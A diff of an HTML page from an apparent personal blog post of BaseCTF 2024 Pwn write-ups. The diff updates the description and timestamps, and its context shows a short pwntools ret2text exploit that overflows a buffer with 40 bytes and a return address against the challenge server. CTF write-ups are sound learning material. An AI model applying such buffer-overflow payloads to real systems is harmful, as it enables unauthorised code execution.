@@ -19,15 +19,15 @@
   <meta name="author" content="voidchunk">
   <meta name="keywords" content="">
   
-    <meta name="description" content="BaseCTF 2024">
+    <meta name="description" content="BaseCTF 2024 全部的Pwn wp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="basectf2024 wp">
 <meta property="og:url" content="https://voidchunk.github.io/2024/09/16/basectf2024-wp/index.html">
 <meta property="og:site_name" content="voidchunk&#39;s blog">
-<meta property="og:description" content="BaseCTF 2024">
+<meta property="og:description" content="BaseCTF 2024 全部的Pwn wp">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-09-16T14:08:24.000Z">
-<meta property="article:modified_time" content="2025-03-15T15:20:12.027Z">
+<meta property="article:modified_time" content="2025-03-15T16:24:22.392Z">
 <meta property="article:author" content="voidchunk">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Pwn">
@@ -324,7 +324,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年3月15日 晚上
+                    本文最后更新于 2025年3月16日 凌晨
                   
                 
               </p>
@@ -332,7 +332,7 @@
             
               <div class="markdown-body">
                 
-                <p>BaseCTF 2024</p>
+                <p>BaseCTF 2024 全部的Pwn wp</p>
 <span id="more"></span>
 
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a>[Week1] Ret2text</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>,<span class="hljs-number">34899</span>)<br>back = <span class="hljs-number">0x4011bb</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(back)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
